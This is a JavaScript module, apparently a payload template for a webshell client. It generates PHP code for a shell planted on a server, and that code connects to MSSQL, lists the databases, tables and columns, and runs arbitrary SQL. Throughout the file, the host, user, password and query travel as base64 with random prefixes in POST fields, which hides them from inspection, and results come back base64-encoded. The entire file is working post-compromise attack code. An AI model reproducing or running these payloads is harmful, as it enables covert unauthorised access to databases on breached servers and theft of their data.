/**
 * 数据库管理模板::mssql
 * i 数据分隔符号 => \t|\t
 */

module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
  // 显示所有数据库
  show_databases: {
    _: `$m=get_magic_quotes_gpc();
      $hst=base64_decode(substr($m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"],#randomPrefix#));
      $usr=base64_decode(substr($m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"],#randomPrefix#));
      $pwd=base64_decode(substr($m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"],#randomPrefix#));
      $T=@mssql_connect($hst,$usr,$pwd);
      $q=@mssql_query("select [name] from master.dbo.sysdatabases order by 1",$T);
      while($rs=@mssql_fetch_row($q)){
        echo(trim($rs[0]).chr(9));
      }
      @mssql_free_result($q);
      @mssql_close($T);`.replace(/\n\s+/g, ''),
    [arg1]: '#{newbase64::host}',
    [arg2]: '#{newbase64::user}',
    [arg3]: '#{newbase64::passwd}'
  },
  // 显示数据库所有表
  show_tables: {
    _: `$m=get_magic_quotes_gpc();
      $hst=base64_decode(substr($m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"],#randomPrefix#));
      $usr=base64_decode(substr($m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"],#randomPrefix#));
      $pwd=base64_decode(substr($m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"],#randomPrefix#));
      $dbn=base64_decode(substr($m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"],#randomPrefix#));
      $T=@mssql_connect($hst,$usr,$pwd);
      @mssql_select_db($dbn,$T);
      $q=@mssql_query("SELECT [name] FROM sysobjects WHERE xtype='U' ORDER BY 1",$T);
      while($rs=@mssql_fetch_row($q)){
        echo(trim($rs[0]).chr(9));
      }
      @mssql_free_result($q);
      @mssql_close($T);`.replace(/\n\s+/g, ''),
    [arg1]: '#{newbase64::host}',
    [arg2]: '#{newbase64::user}',
    [arg3]: '#{newbase64::passwd}',
    [arg4]: '#{newbase64::db}'
  },
  // 显示表字段
  show_columns: {
    _: `$m=get_magic_quotes_gpc();
      $hst=base64_decode(substr($m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"],#randomPrefix#));
      $usr=base64_decode(substr($m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"],#randomPrefix#));
      $pwd=base64_decode(substr($m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"],#randomPrefix#));
      $dbn=base64_decode(substr($m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"],#randomPrefix#));
      $tab=base64_decode(substr($m?stripslashes($_POST["${arg5}"]):$_POST["${arg5}"],#randomPrefix#));
      $T=@mssql_connect($hst,$usr,$pwd);
      @mssql_select_db($dbn,$T);
      $q=@mssql_query("SELECT TOP 1 * FROM {$tab}",$T);
      while($rs=@mssql_fetch_field($q)){
        echo(trim($rs->name)." ({$rs->type}({$rs->max_length}))".chr(9));
      }
      @mssql_free_result($q);
      @mssql_close($T);`.replace(/\n\s+/g, ''),
    [arg1]: '#{newbase64::host}',
    [arg2]: '#{newbase64::user}',
    [arg3]: '#{newbase64::passwd}',
    [arg4]: '#{newbase64::db}',
    [arg5]: '#{newbase64::table}'
  },
  // 执行SQL语句
  query: {
    _: `$m=get_magic_quotes_gpc();
      $hst=base64_decode(substr($m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"],#randomPrefix#));
      $usr=base64_decode(substr($m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"],#randomPrefix#));
      $pwd=base64_decode(substr($m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"],#randomPrefix#));
      $dbn=base64_decode(substr($m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"],#randomPrefix#));
      $sql=base64_decode(substr($m?stripslashes($_POST["${arg5}"]):$_POST["${arg5}"],#randomPrefix#));
      $T=@mssql_connect($hst,$usr,$pwd);
      @mssql_select_db($dbn,$T);
      $q=@mssql_query($sql,$T);
      if(is_bool($q)){
        echo("Status\\t|\\tAffect Rows\\t|\\t\\r\\n".($q?"VHJ1ZQ==":"RmFsc2U=")."\\t|\\t".base64_encode(@mssql_rows_affected($T)." row(s)")."\\t|\\t\\r\\n");
      }else{
        $i=0;
        while($rs=@mssql_fetch_field($q)){
          echo($rs->name."\\t|\\t");
          $i++;
        }
        echo("\\r\\n");
        while($rs=@mssql_fetch_row($q)){
          for($c=0;$c<$i;$c++){
            echo(base64_encode(trim($rs[$c])));
            echo("\\t|\\t");
          }
          echo("\\r\\n");
        }
        @mssql_free_result($q);
      }
      @mssql_close($T);`.replace(/\n\s+/g, ''),
    [arg1]: '#{newbase64::host}',
    [arg2]: '#{newbase64::user}',
    [arg3]: '#{newbase64::passwd}',
    [arg4]: '#{newbase64::db}',
    [arg5]: '#{newbase64::sql}',
  }
})